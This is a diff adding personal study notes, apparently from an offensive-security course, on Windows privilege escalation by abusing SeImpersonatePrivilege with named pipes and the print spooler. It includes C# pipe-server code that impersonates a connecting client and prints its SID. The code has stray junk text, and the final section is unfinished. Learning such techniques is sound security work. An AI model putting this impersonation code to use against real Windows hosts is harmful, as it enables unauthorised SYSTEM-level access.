@@ -260,6 +260,290 @@ as displayed in Figure 225
 command prompt as well as an elevated command prompt
 done
 
+# Elevation with impoersonation
+
+various ways to levrage certain privileges for escalation
+
+There are 9 didfferent way:
+
+https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
+
+two privileges that are required are for rotten potato
+using rotten potato for privilege escalation - https://github.com/breenmachine/RottenPotatoNG - seimpersonate privilege needs to be there
+
+privileges in total that were abused-
+
+SeImpersonatePrivilege
+SeAssignPrimaryPrivilege
+SeTcbPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeCreateTokenPrivilege
+SeLoadDriverPrivilege
+SeTakeOwnershipPrivilege
+SeDebugPrivilege
+
+search for whoami /priv to dinf our what is applicable
+
+we can impersonate any token for which we can get a reference or handle.  IIS always has this by default. Thats why rce on a web shell might be important.
+
+SeIMpersonatePrivilege often use the Win32 DuplicateTokenEx API to create a primary token for impersonation.
+
+we are using a post exploitation attack that relies on windows pipes.
+
+Pipes are for interprocess commuication.
+
+A pipe is a section of shared memory inside the kernel that process can use for communication. one process will makea pipe and the other process can read write information.
+
+anonymous pipes for communication between parent and child process
+named pipes are more broadly used.
+
+named pipes support impoersonation.
+
+we are trying to get system accunt to connect to a named pipe set up by an attacker.
+
+it is done through print spooler service which runs on system context
+
+print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. 
+
+if we create a proess running with SeImpersonatePrivilege that simulates a print client we will obtain a SYSTEM token that we can impersonate.
+
+To demonstrate this, we will create C# application that creates a pipe servver and waits for a connection and attempts to impersonate the client that connects to it.
+
+ImpersonateNamedPipeClient
+CreateNamedPipe
+ConnectNamedPipe
+
+### CreateNamedPipeA
+
+```
+HANDLE CreateNamedPipeA(
+  [in]           LPCSTR                lpName, # pipename - format  - \\.\pipe\pipename
+  [in]           DWORD                 dwOpenMode, # dwOpenMode PIPE_ACCESS_DUPLEX enum and is equivalent of 3
+  [in]           DWORD                 dwPipeMode, # PIPE_TYPE_BYTE and PIPE_WIAT
+  [in]           DWORD                 nMaxInstances,# between 1 and 255
+  [in]           DWORD                 nOutBufferSize, # 0x1000
+  [in]           DWORD                 nInBufferSize, # 0x1000
+  [in]           DWORD                 nDefaultTimeOut, # 0
+  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes
+);
+```
+
+
+```
+
+to list named pipes :
+
+```powershell
+PS C:\Users\HP> [System.IO.Directory]::GetFiles("\\.\\pipe\\")
+\\.\\pipe\\InitShutdown
+\\.\\pipe\\lsass
+\\.\\pipe\\ntsvcs
+\\.\\pipe\\scerpc
+\\.\\pipe\\Winsock2\CatalogChangeListener-2f4-0
+\\.\\pipe\\Winsock2\CatalogChangeListener-3e8-0
+\\.\\pipe\\epmapper
+\\.\\pipe\\Winsock2\CatalogChangeListener-250-0
+\\.\\pipe\\LSM_API_service
+\\.\\pipe\\Winsock2\CatalogChangeListener-1c4-0
+\\.\\pipe\\atsvc
+\\.\\pipe\\eventlog
+\\.\\pipe\\Winsock2\CatalogChangeListener-648-0
+\\.\\pipe\\Winsock2\CatalogChangeListener-534-0
+\\.\\pipe\\wkssvc
+\\.\\pipe\\TermSrv_API_service
+\\.\\pipe\\Ctx_WinStation_API_service
+\\.\\pipe\\srvsvc
+\\.\\pipe\\SessEnvPublicRpc
+\\.\\pipe\\Winsock2\CatalogChangeListener-a64-0
+\\.\\pipe\\spoolss
+\\.\\pipe\\Winsock2\CatalogChangeListener-c0c-0
+\\.\\pipe\\trkwks
+\\.\\pipe\\vgauth-service
+\\.\\pipe\\W32TIME_ALT
+\\.\\pipe\\Winsock2\CatalogChangeListener-2e0-0
+\\.\\pipe\\Winsock2\CatalogChangeListener-774-0
+\\.\\pipe\\browser
+\\.\\pipe\\ROUTER
+\\.\\pipe\\PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+\\.\\pipe\\MsFteWds
+\\.\\pipe\\SearchTextHarvester
+\\.\\pipe\\GoogleCrashServices\S-1-5-18
+\\.\\pipe\\GoogleCrashServices\S-1-5-18-x64
+\\.\\pipe\\LOCAL\crashpad_8448_QYUZKVTVVALAURMI
+\\.\\pipe\\LOCAL\mojo.8448.8452.12086734017565636582
+\\.\\pipe\\LOCAL\mojo.8448.8452.2715017532755955870
+\\.\\pipe\\LOCAL\mojo.8448.8648.8652493699449017659
+\\.\\pipe\\LOCAL\mojo.8448.8648.5489605534324796864
+\\.\\pipe\\LOCAL\mojo.8448.8452.7930760313427659378
+\\.\\pipe\\LOCAL\mojo.8448.8648.2683836670789291820
+\\.\\pipe\\LOCAL\mojo.external_task_manager_8448
+\\.\\pipe\\LOCAL\mojo.8448.8452.7516465052930967985
+\\.\\pipe\\LOCAL\mojo.8448.8648.1131271969707673641
+\\.\\pipe\\LOCAL\mojo.8448.8648.4324666146515799488
+\\.\\pipe\\LOCAL\mojo.8448.8648.13008396823400832788
+\\.\\pipe\\LOCAL\mojo.8448.8452.12672853552456055722
+\\.\\pipe\\LOCAL\mojo.8448.8452.16688316265066250276
+\\.\\pipe\\LOCAL\mojo.8448.8648.16786454823625649801
+\\.\\pipe\\LOCAL\mojo.8448.8648.16998835998525809685
+\\.\\pipe\\LOCAL\mojo.8448.8648.7608631290019781186
+\\.\\pipe\\LOCAL\mojo.8448.8648.11997790032646474622
+\\.\\pipe\\dotnet-diagnostic-9604
+\\.\\pipe\\crashpad_6636_JPIVMGLTANABFCYP
+\\.\\pipe\\mojo.6636.948.17111454641751927451
+
+```
+
+# program to connect ot a named pipe
+
+```C#
+using System;
+using System.Runtime.InteropServices;
+
+namespace console_csharp
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode,
+        uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize,
+        uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll")]
+        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+        [DllImport("Advapi32.dll")]
+        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+
+        static void Main(string[] args)
+        {
+            if (args.Length ==0)
+            {
+                Console.WriteLine("Usage: console_sharp.exe pipename");
+                return;
+            }
+            string pipeName = args[0];
+            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
+            ConnectNamedPipe(hPipe, IntPtr.Zero);
+            ImpersonateNamedPipeClient(hPipe);
+        }
+    }
+}
+```
+
+Since we have no way to confirm that the impersonation actually worked we need to 
+
+open the impersonated token with
+OpenThreadToken722 and then use GetTokenInformation723 to obtain the SID associated with the
+token. Finally, we can call ConvertSidToStringSid724 to convert the SID to a readable SID string
+
+
+we will use OpenthreadToken, GetTokenInformation
+
+```
+BOOL OpenThreadToken(
+HANDLE ThreadHandle, # we will use GetCurrentThread
+DWORD DesiredAccess, # # TOKEN_ALL_ACCESS 0xF01FF
+BOOL OpenAsSelf, # False
+PHANDLE TokenHandle # handle to token will be populated in this pointer
+);
+
+BOOL GetTokenInformation(
+HANDLE TokenHandle, # from openThread Token TokenHandle
+TOKEN_INFORMATION_CLASS TokenInformationClass, # type of information its is an enum that has value specifying the tyype of information we can retrieve - 1
+LPVOID TokenInformation, # pointer to output buffer 
+DWORD TokenInformationLength, # NULL
+PDWORD ReturnLength # 0
+);
+```
+
+We may have to call the GetTokenInformation twice since we need to know the token information length.
+
+and as a final steo we will use conversidTo StringSid to convert the binary SID to a SID string that we can read.
+
+```
+using System;
+using System.Runtime.InteropServices;
+
+namespace console_csharp
+{
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SID_AND_ATTRIBUTES
+    {
+        public IntPtr Sid;
+        public int Attributes;
+    }
+    public struct TOKEN_USER
+    {
+        public SID_AND_ATTRIBUTES User;
+    }
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode,
+        uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize,
+        uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll")]
+        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+        [DllImport("Advapi32.dll")]
+        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentThread();
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool
+        OpenAsSelf, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
+        IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
+
+        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
+
+        static void Main(string[] args)
+        {
+            if (args.Length ==0)
+            {
+                Console.WriteLine("Usage: console_sharp.exe pipename");
+                return;
+            }
+            string pipeName = args[0];
+            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
+            ConnectNamedPipe(hPipe, IntPtr.Zero);
+            ImpersonateNamedPipeClient(hPipe);
+
+            IntPtr hToken;
+            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
+
+            int TokenInfLength = 0;
+            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
+            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
+
+            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
+            IntPtr pstr = IntPtr.Zero;
+            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
+            string sidstr = Marshal.PtrToStringAuto(pstr);
+            Console.WriteLine(@"Found sid {0}", sidstr);
+        }hgrf zxc
+    }
+}
+```
+
+full program to do
+
+
+
+
+
+
+
+
+
 
 
 
